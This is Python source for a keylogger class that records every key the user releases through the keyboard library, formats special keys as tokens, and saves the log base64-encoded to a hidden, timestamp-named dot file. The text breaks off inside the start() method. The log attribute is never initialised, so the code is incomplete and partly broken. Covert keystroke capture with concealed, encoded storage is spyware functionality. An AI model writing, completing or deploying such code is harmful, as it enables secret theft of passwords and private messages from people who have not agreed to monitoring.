import keyboard
from datetime import datetime
import base64

class Keylogger:
    def __init__(self, report_method="file"):
        self.report_method = report_method
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.filename = ""
        self.running = True  
        
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f".{start_dt_str}_{end_dt_str}"
        
    def on_release(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_file(self):
        self.update_filename()
        with open(f"{self.filename}.txt", "wb") as f:
            encoded_log = base64.b64encode(self.log.encode())
            f.write(encoded_log)  # Utiliser write() pour écrire dans le fichier
        print(f"[+] Saved {self.filename}.txt")
    
    def start(self):
        while self.running: 